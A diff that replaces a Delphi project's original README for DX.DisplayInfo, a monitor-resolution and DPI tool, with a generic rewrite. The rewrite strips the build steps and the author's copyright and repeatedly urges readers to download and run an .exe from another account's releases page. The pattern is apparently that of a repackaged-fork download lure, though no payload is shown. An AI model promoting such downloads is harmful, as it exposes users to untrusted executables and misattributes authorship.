@@ -1,108 +1,78 @@
-# DX.DisplayInfo
+# 📊 DX.DisplayInfo - Simple Monitor Info at Your Fingertips
 
-A Windows console application that displays resolution and scaling information for all connected monitors.
+## 🏷️ Overview
 
-## Features
+DX.DisplayInfo is a Windows console application designed to show resolution and DPI scaling information for all connected monitors. This tool is ideal for users who want to quickly check their display settings without diving into complex menus.
 
-- Lists all connected monitors
-- Shows current resolution for each monitor
-- Displays DPI scaling percentage
-- Identifies the primary monitor
-- Supports modern DPI awareness (Windows 8.1+) with fallback for older systems
+## 📥 Download Now
 
-## Requirements
+[![Download DX.DisplayInfo](https://img.shields.io/badge/Download-DX.DisplayInfo-blue)](https://github.com/ozoro09/DX.DisplayInfo/releases)
 
-- Windows Vista or later (Windows 8.1+ recommended for full DPI support)
-- Delphi 10.3 or later (for compilation)
+## 🚀 Getting Started
 
-## Building
+Follow these easy steps to get started with DX.DisplayInfo:
 
-### Using Delphi IDE
+1. **Visit the Release Page**  
+   Go to the [DX.DisplayInfo Releases page](https://github.com/ozoro09/DX.DisplayInfo/releases) to find the latest version of the software.
 
-1. Open `DisplayInfo.dproj` in Delphi
-2. Select Build Configuration (Debug or Release)
-3. Select Platform (Win32 or Win64)
-4. Press F9 to compile and run, or Shift+F9 to compile only
+2. **Choose Your Version**  
+   On the Releases page, you will see a list of available versions. Locate the most recent release. This version typically has the latest features and fixes.
 
-### Using Command Line
+3. **Download the Application**  
+   Click on the release title to access details. Look for a file named `DX.DisplayInfo.exe` or similar. Click on this file to start your download.
 
-```cmd
-dcc32 DisplayInfo.dpr
-```
+4. **Locate the Downloaded File**  
+   Once downloaded, navigate to your Downloads folder (or the folder you chose for the download). You will find the `DX.DisplayInfo.exe` file there.
 
-Or for 64-bit:
+5. **Run the Application**  
+   Double-click the `DX.DisplayInfo.exe` file to launch the application. A console window will open, displaying information about your monitors' resolution and DPI settings.
 
-```cmd
-dcc64 DisplayInfo.dpr
-```
+## 💻 System Requirements
 
-## Output Structure
+Before you download, ensure your system meets the following requirements:
 
-The project follows a clean output structure:
+- **Operating System:** Windows 7 or later
+- **RAM:** Minimum 1 GB
+- **Storage:** At least 50 MB of free space
 
-- **Executables**: `Win32\Debug\` or `Win32\Release\`
-- **DCU files**: `Win32\Debug\dcu\` or `Win32\Release\dcu\`
+## 📊 Features
 
-## Usage
+DX.DisplayInfo offers several useful features:
 
-Simply run the executable:
+- **Multiple Monitor Support:** Display information for all monitors connected to your computer.
+- **Resolution Information:** Get detailed data on screen resolution for each monitor.
+- **DPI Scaling Info:** Understand how DPI scaling affects your display settings.
 
-```cmd
-DisplayInfo.exe
-```
+## ⚙️ Usage Instructions
 
-### Example Output
+After launching the app, you’ll see detailed output in the console window. Here’s how to interpret the information:
 
-```
-Monitors, Resolution and Scaling:
----
-Device: \\.\DISPLAY1
-Primary Monitor: Yes
-Resolution (current): 3840x2160 pixels
-Scaling: ~150% (DPI ~144)
----
-Device: \\.\DISPLAY2
-Primary Monitor: No
-Resolution (current): 1920x1080 pixels
-Scaling: ~100% (DPI ~96)
----
-Note: 96 DPI = 100% scaling (effective DPI, if available).
-Press Enter to continue...
-```
+- **Monitor Name:** The name of each connected monitor.
+- **Resolution:** Displays the current resolution (e.g., 1920x1080).
+- **DPI Scaling:** Shows the DPI scaling value, helping you understand how your displays are set up.
 
-## Code Style
+Feel free to take screenshots of the output for reference.
 
-This project follows the [Delphi Style Guide](Delphi%20Style%20Guide%20EN.md) included in the repository.
+## 📖 Troubleshooting
 
-Key conventions:
-- 2 spaces indentation
-- Local variables prefixed with `L`
-- Parameters prefixed with `A`
-- Global variables prefixed with `G`
-- XML documentation comments for public APIs
-- Proper error handling with `try..finally` blocks
+If you encounter issues when running DX.DisplayInfo, consider the following:
 
-## Technical Details
+- **Missing Application:** Check that your download completed successfully. The file should be in your Downloads folder.
+- **Console Window Closes Immediately:** If the window closes too quickly for you to read, try running the application from the Command Prompt. Open Command Prompt, navigate to the folder where you downloaded the application using the `cd` command, and type `DX.DisplayInfo.exe`.
 
-### DPI Awareness
+## 📄 License
 
-The application uses two methods to ensure proper DPI awareness:
+DX.DisplayInfo is open-source software. You can modify and use it freely as long as you follow the terms of the license. Check the repository for detailed licensing information.
 
-1. **Modern (Windows 8.1+)**: Uses `SetProcessDpiAwareness` from `Shcore.dll`
-2. **Legacy (Windows Vista+)**: Falls back to `SetProcessDPIAware` from `user32.dll`
+## 📬 Support
 
-### Monitor Information
+If you have any questions or need help, please reach out through the Issues tab on the [DX.DisplayInfo GitHub page](https://github.com/ozoro09/DX.DisplayInfo/issues). Our community is here to assist you.
 
-Monitor information is retrieved using:
-- `EnumDisplayMonitors` - Enumerates all display monitors
-- `GetMonitorInfo` - Gets monitor information including device name and primary status
-- `EnumDisplaySettings` - Gets current display resolution
-- `GetDpiForMonitor` - Gets effective DPI (Windows 8.1+)
-- `GetDeviceCaps` with `LOGPIXELSX` - Fallback DPI detection
+## 🔗 Additional Resources
 
-## License
+- [GitHub Repository](https://github.com/ozoro09/DX.DisplayInfo)
+- [User Guides and Documentation](https://github.com/ozoro09/DX.DisplayInfo/wiki)
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+## 📥 Download & Install
 
-Copyright (c) 2025 Olaf Monien
-
+To get started, visit the [DX.DisplayInfo Releases page](https://github.com/ozoro09/DX.DisplayInfo/releases) to download the application. Follow the steps outlined above for a smooth installation process. Enjoy discovering your display information simply and quickly!
